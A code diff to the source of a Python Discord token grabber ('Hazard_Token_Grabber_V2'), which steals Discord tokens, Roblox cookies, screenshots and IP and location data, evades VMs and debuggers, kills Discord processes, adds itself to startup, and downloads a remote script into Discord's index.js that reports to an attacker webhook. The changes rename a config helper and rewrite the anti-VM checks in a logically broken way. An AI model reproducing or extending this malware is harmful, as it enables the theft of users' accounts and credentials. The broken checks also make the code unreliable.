@@ -106,13 +106,13 @@ class functions(object):
             return "Failed to decrypt password"
 
     @staticmethod
-    def config(e: str) -> str or bool | None:
+    def fetchConf(e: str) -> str or bool | None:
         return config.get(e)
 
 
 class Hazard_Token_Grabber_V2(functions):
     def __init__(self):
-        self.webhook = self.config('webhook')
+        self.webhook = self.fetchConf('webhook')
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -148,20 +148,20 @@ class Hazard_Token_Grabber_V2(functions):
             self.tokens.append(tkn)
 
     async def init(self):
-        if self.config('anti_debug'):
+        if self.fetchConf('anti_debug'):
             if AntiDebug().inVM:
                 os._exit(0)
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
         function_list = [self.screenshot, self.grabTokens,
                          self.grabRobloxCookie]
-        if self.config('hide_self'):
+        if self.fetchConf('hide_self'):
             function_list.append(self.hide)
 
-        if self.config('kill_processes'):
+        if self.fetchConf('kill_processes'):
             await self.killProcesses()
 
-        if self.config('startup'):
+        if self.fetchConf('startup'):
             function_list.append(self.startup)
 
         if os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Default') and os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
@@ -206,14 +206,14 @@ class Hazard_Token_Grabber_V2(functions):
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            f = httpx.get(self.config('injection_url')).text.replace(
+                            f = httpx.get(self.fetchConf('injection_url')).text.replace(
                                 "%WEBHOOK%", self.webhook)
                             with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                 indexFile.write(f)
                             os.startfile(app + self.sep + _dir + '.exe')
 
     async def killProcesses(self):
-        blackListedPrograms = self.config('blackListedPrograms')
+        blackListedPrograms = self.fetchConf('blackListedPrograms')
         for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
             blackListedPrograms.append(i)
         for proc in psutil.process_iter():
@@ -492,11 +492,11 @@ class Hazard_Token_Grabber_V2(functions):
         disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
         # ip, country, city, region, googlemap = "None"
         data = httpx.get("https://ipinfo.io/json").json()
-        ip = data.get('ip').replace(" ", "᠎ ")
-        city = data.get('city').replace(" ", "᠎ ")
-        country = data.get('country').replace(" ", "᠎ ")
-        region = data.get('region').replace(" ", "᠎ ")
-        org = data.get('org').replace(" ", "᠎ ")
+        ip = data.get('ip')
+        city = data.get('city')
+        country = data.get('country')
+        region = data.get('region')
+        org = data.get('org')
         googlemap = "https://www.google.com/maps/search/google+map++" + \
             data.get('loc')
 
@@ -533,11 +533,11 @@ class Hazard_Token_Grabber_V2(functions):
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                IP:᠎ {ip}
-                                Org:᠎ {org}
-                                City:᠎ {city}
-                                Region:᠎ {region}
-                                Country:᠎ {country}```
+                                IP:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
+                                Org:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
+                                City:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
+                                Region:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
+                                Country:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
                             '''.replace(' ', ''),
                             'inline': True
                         },
@@ -650,7 +650,7 @@ class AntiDebug(functions):
             "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
         reg2 = os.system(
             "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
-        if reg1 != 1 and reg2 != 1:
+        if (reg1 and reg2) != 1:
             self.programExit()
 
         handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
@@ -658,7 +658,7 @@ class AntiDebug(functions):
         try:
             reg_val = winreg.QueryValueEx(handle, '0')[0]
 
-            if "VMware" in reg_val or "VBOX" in reg_val:
+            if ("VMware" or "VBOX") in reg_val:
                 self.programExit()
         finally:
             winreg.CloseKey(handle)
